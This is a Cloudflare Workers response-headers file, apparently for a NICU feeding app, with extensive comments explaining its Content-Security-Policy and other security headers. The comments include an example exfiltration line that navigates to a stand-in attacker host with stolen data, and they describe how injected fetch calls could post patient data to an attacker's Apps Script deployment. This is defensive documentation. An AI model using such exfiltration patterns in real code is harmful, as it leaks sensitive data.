# Response headers for the Cloudflare Workers host.
#
# ⚠️ THIS FILE PROTECTS ONE OF THE TWO HOSTS. GitHub Pages has no `_headers`
# support and ignores it completely, so everything below applies to
# neofeed.valhalla-health.workers.dev and does nothing whatsoever for
# valhalla-health.github.io/neofeed/ — which is still where NICU staff
# home-screen installs point. Same asymmetry as `.assetsignore`. See STATUS.md.
#
# Wrangler consumes `_headers` as configuration rather than publishing it, so
# unlike `wrangler.jsonc` it is not served back. Verified 2026-08-23.
#
# ── What the CSP below can and cannot do ─────────────────────────────────────
#
# `script-src` is `'self' https://accounts.google.com` and nothing else, since
# the 2026-09-17 build step. Until then it had to carry 'unsafe-eval' and
# 'unsafe-inline': @babel/standalone compiled the .jsx modules in the browser
# (eval) and ran the result as injected inline <script>s. Now tools/build.mjs
# precompiles them to compiled/*.js, React and ReactDOM are served from
# vendor/, and the two old inline scripts (the GitHub Pages guard and the
# NEOFEED_* config) live in boot.js. Every script the app runs is a file in
# this repo, served from this origin, plus Google Sign-In.
#
# ⚠️ THIS POLICY AND THE TWO HTML SHELLS SHIP TOGETHER. Under this policy a
# shell that still loads Babel or unpkg, or has an inline <script>, renders a
# blank page (verified in Chromium 2026-09-17). Never revert one without the
# other; reverting the release merge reverts both. test/verify-build-shells.cjs
# fails if either half drifts.
#
# So be precise about what this buys:
#   - Injected inline script (`<script>…</script>`, `onerror=` attributes,
#     `javascript:` URLs) and eval/new Function do NOT run. Script from any
#     other origin does not load.
#   - It does NOT stop script already on this origin from misbehaving. The
#     shells and compiled/ are the trust boundary for that, which is why CI
#     rebuilds compiled/ from the .jsx sources and fails on any difference.
#   - `style-src` still allows 'unsafe-inline': all CSS lives in <style> blocks
#     inside the shells (Center Point's build reads it from there).
#   - moved.html's inline storage-clearing script is blocked here. That page
#     exists for the GitHub Pages host, which sends no CSP; on this host the
#     block is the right outcome, not a regression.
#   - `connect-src` names NEOFEED_GAS_URL by its FULL path, not the bare
#     https://script.google.com it named until 2026-09-17. Anyone can deploy
#     an Apps Script web app on script.google.com, so the bare origin let an
#     injected `fetch` post patient data to an attacker's own deployment
#     (2026-09-17 review, SEC-F4). A path source matches that one /exec only.
#     If the deployment ID ever changes, this line and boot.js's
#     `window.NEOFEED_GAS_URL` change together —
#     test/verify-review-0917-shell.cjs fails when they disagree.
#   - https://script.googleusercontent.com stays origin-wide: /exec answers
#     with a 302 to a per-response URL there, and CSP ignores the path of a
#     redirect target anyway.
#   - No CSP directive governs top-level navigation, so
#     `location.href = "https://attacker/?d=…"` is NOT blocked by anything here.
#
# Origin-by-origin, and why each is here — do not add to this list casually,
# because the list is the entire point:
#   'self'                 index.html, boot.js, data.js, compiled/*.js, vendor/*.js
#                          (React 18.3.1 + ReactDOM, byte-identical to the unpkg
#                          builds the shells used to pin by SRI)
#   accounts.google.com    /gsi/client, plus the sign-in iframe it renders
#   fonts.googleapis.com   the IBM Plex / Sarabun stylesheet
#   fonts.gstatic.com      the font files that stylesheet pulls
#   accounts.google.com/gsi/style  Sign-In's own stylesheet — observed BLOCKED in a
#                          real browser console 2026-09-11 before this was added
#   script.google.com/macros/s/<deployment>/exec   NEOFEED_GAS_URL, full path — every backend call
#   *.googleusercontent.com  where a GAS /exec 302-redirects its response
#   data:                  inline SVG data URIs (img-src)
#
# `Cross-Origin-Opener-Policy` is `same-origin-allow-popups`, NOT `same-origin`.
# Google Sign-In opens a popup for the account chooser; plain `same-origin`
# severs `window.opener` and the login callback never fires. Google documents
# the allow-popups value for exactly this. Do not "harden" it.
#
# Frontend hosts are origin-bound for Google Sign-In anyway — every hostname
# must be an Authorized JavaScript origin on OAuth client 750019806043-imunne8n…
# (REFERENCE.md § Deploying). CSP and that allow-list are separate gates; a
# change here does not touch that one.
#
# ── Caching ──────────────────────────────────────────────────────────────────
# vendor/ file names carry the React version and the build refuses any other
# bytes under them, so those two files can be cached for a year. Nothing else
# gets this: boot.js, data.js and compiled/*.js are cache-busted by their ?v=
# content hash in the shells, and index.html itself must always revalidate.

/*
  Content-Security-Policy: default-src 'self'; script-src 'self' https://accounts.google.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://accounts.google.com/gsi/style; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://*.gstatic.com https://*.googleusercontent.com; connect-src 'self' https://script.google.com/macros/s/AKfycbz8NtHuyTdo4EP-ZKb5n5LIRqVzGSY286MZRlXMniO51xjiuQO7eOLvltsrejkL4GgV/exec https://script.googleusercontent.com https://accounts.google.com; frame-src https://accounts.google.com; manifest-src 'self'; base-uri 'none'; form-action 'self'; object-src 'none'; frame-ancestors 'none'
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Cross-Origin-Opener-Policy: same-origin-allow-popups
  Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=()
  Strict-Transport-Security: max-age=31536000
  X-Robots-Tag: noindex, nofollow

/vendor/*
  Cache-Control: public, max-age=31536000, immutable
